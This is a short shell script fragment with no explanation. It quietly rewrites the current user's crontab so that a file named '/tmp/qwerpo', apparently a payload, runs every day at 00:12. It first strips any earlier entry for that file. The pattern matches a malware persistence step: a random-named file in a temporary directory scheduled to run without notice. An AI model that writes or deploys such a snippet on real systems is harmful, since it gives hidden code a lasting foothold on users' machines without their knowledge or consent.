PLD_NAME="/tmp/qwerpo"
crontab -l 
if [ $? -eq 0 ]; then
  crontab -l | grep -iv $PLD_NAME > /tmp/ctt
  echo "12 0 * * * $PLD_NAME" >> /tmp/ctt
  crontab < /tmp/ctt
  rm /tmp/ctt
else
  echo "12 0 * * * $PLD_NAME" | crontab
fi


